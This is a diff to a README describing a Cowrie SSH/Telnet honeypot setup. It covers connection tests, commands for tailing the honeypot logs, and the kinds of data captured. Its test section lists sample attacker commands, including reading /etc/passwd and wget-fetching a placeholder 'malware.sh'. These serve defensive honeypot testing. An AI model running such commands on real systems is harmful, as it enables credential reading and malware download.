@@ -35,10 +35,26 @@ By deploying a **Cowrie SSH honeypot**, I was able to capture attacker behavior,
 ### SSH Test
 ```bash
 ssh root@<Honeypot_Public_IP> -p 2222
+```
 
 ## Try Fake Commands
 ls
 cat /etc/passwd
 wget http://example.com/malware.sh
+
+### Telnet Test
+telnet <Honeypot_Public_IP> 2223
+
+### Check Logs Directly
+cd ~/cowrie/var/log/cowrie/
+tail -f cowrie.log
+tail -f jsonlog.json
+
+## Data Captured
+1. Brute Force Attempts
+2. Attacker Commands
+3. Credential Reuse
+
+## Screenshots
 
 
